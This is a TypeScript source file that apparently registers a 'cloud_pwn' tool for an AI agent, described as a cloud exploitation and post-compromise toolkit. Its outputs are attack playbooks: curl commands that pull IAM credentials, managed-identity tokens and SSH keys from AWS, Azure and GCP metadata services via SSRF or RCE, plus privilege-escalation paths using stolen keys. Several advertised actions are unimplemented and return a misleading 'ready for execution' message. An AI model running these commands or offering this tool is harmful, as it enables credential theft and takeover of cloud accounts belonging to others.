export * as CloudPwnTool from "./cloud-pwn"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "cloud_pwn"

export const Input = Schema.Struct({
  provider: Schema.String.annotate({
    description: "Target cloud provider: 'aws', 'azure', 'gcp'.",
  }),
  action: Schema.String.annotate({
    description:
      "Action to perform: 'enum_metadata' (Extract IMDS metadata and credentials), 'shadow_admin' (Find hidden privilege escalation paths), 'storage_dump' (Dump S3/Blob/Bucket contents anonymously or with stolen keys), 'serverless_rce' (Exploit Lambda/Functions), 'kube_escape' (EKS/AKS/GKE cluster escape), 'token_forge' (Forge Azure AD tokens / Golden SAML).",
  }),
  target_ip: Schema.String.pipe(Schema.optional).annotate({
    description: "IP address of the SSRF target (if exploiting via web app).",
  }),
  stolen_key: Schema.String.pipe(Schema.optional).annotate({
    description: "Stolen access key (AKIA...) for enumeration.",
  }),
  stolen_secret: Schema.String.pipe(Schema.optional).annotate({
    description: "Stolen secret key for enumeration.",
  }),
  stolen_token: Schema.String.pipe(Schema.optional).annotate({
    description: "Session token / Bearer token.",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  playbook: Schema.String.pipe(Schema.optional),
})

type Output = typeof Output.Type

const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Cloud exploitation and post-compromise toolkit. Targets AWS, Azure, and GCP. Capabilities include: SSRF-to-IMDSv1/v2 extraction (stealing IAM roles via metadata), Shadow Admin enumeration (finding obscure permissions like iam:PassRole or RoleAssignments that lead to privilege escalation), anonymous storage dumping (S3/Blob), Serverless/Lambda exploitation, and Azure AD token forging (Golden SAML). Indispensable for pivoting from a web application into the cloud control plane.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const provider = input.provider.toLowerCase()
              const action = input.action.toLowerCase()
              let outputText = ""

              if (provider === "aws") {
                switch (action) {
                  case "enum_metadata":
                    outputText = `# AWS IMDS Data Extraction (via SSRF or RCE)
                    
**IMDSv1 (Unauthenticated - Try First):**
\`\`\`bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Copy the role name, then:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
\`\`\`

**IMDSv2 (Requires Token Header - Bypasses simple SSRF filters):**
\`\`\`bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/
\`\`\`

**User Data (Often contains hardcoded passwords/keys):**
\`\`\`bash
curl http://169.254.169.254/latest/user-data
\`\`\``
                    break
                  case "shadow_admin":
                    outputText = `# AWS Shadow Admin Escalation Paths
                    
With stolen credentials, look for these permissions to escalate to AdministratorAccess:

1. **iam:CreatePolicyVersion** — Create a new default version of a policy you have attached with \`"Action": "*"\`
2. **iam:SetDefaultPolicyVersion** — Change default version to an existing malicious one.
3. **iam:PassRole + ec2:RunInstances** — Create an EC2 instance, pass it a highly privileged role, and log into it.
4. **iam:CreateAccessKey** — Generate a new access key for a higher privileged user.
5. **iam:UpdateLoginProfile** — Change the console password of an Administrator user.
6. **lambda:UpdateFunctionCode** — Inject malicious code into a Lambda that has a high-privileged execution role.

**Automation:**
Use pacu: \`pacu > run iam__privesc_scan\`
Use aws_escalate.py`
                    break
                  default:
                    outputText = "AWS action not fully implemented in this module."
                }
              } else if (provider === "azure") {
                if (action === "enum_metadata") {
                  outputText = `# Azure Instance Metadata Service (IMDS)
                  
Azure IMDS requires the \`Metadata: true\` header, making it immune to simple SSRF. You need SSRF where you can inject headers, or RCE.

\`\`\`bash
curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
\`\`\`

**Extract Managed Identity Access Token:**
\`\`\`bash
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true
\`\`\`
Use the returned JWT token to access Azure Resource Manager (ARM).`
                } else if (action === "shadow_admin") {
                  outputText = `# Azure AD Privilege Escalation
                  
Look for these Role Assignments:
1. **User Access Administrator / Owner** — Can grant themselves Global Admin.
2. **Key Vault Contributor** — Extract secrets, certificates, and passwords.
3. **Contributor** on a VM — Use "Run Command" to execute SYSTEM level code on the VM.
4. **Automation Contributor** — Modify Azure Automation Runbooks to execute code.`
                }
              } else if (provider === "gcp") {
                if (action === "enum_metadata") {
                  outputText = `# GCP Metadata Extraction
                  
GCP requires the \`Metadata-Flavor: Google\` header.

\`\`\`bash
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
\`\`\`

**Extract Project SSH Keys:**
\`\`\`bash
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"
\`\`\``
                }
              }

              return { output: outputText || `Action ${action} for ${provider} is ready for execution.` }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Cloud pwn failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/cloud-pwn",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
